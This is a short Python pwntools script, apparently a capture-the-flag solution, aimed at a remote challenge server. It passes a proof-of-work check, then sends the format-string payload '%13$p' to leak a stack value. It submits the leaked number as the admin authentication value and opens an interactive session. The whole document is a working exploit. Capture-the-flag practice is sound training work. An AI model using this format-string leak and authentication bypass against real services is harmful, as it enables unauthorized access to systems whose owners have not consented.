from pwn import *

HOST, PORT = 'ctf.csd.lol', 7777

p = remote(HOST, PORT)
p.recvuntil(b' -s ')
challenge = p.recvline().decode().strip()
p2 = process(['/home/sidis/redpwnpow-linux-amd64', challenge])
ans = p2.recvline().strip().decode()
p.sendline(ans.encode())

p.recvuntil(b'cmd: ')
p.sendline(b'write')
p.recvuntil(b'data: ')
p.sendline(b'%13$p')
p.sendline(b'read')
p.recvuntil(b'data:\n')
res = p.recvline().strip().decode()[2:10]
res = int(res, 16)
p.sendline(b'admin')
p.recvuntil(b'auth: ')
p.sendline(str(res).encode())

p.interactive()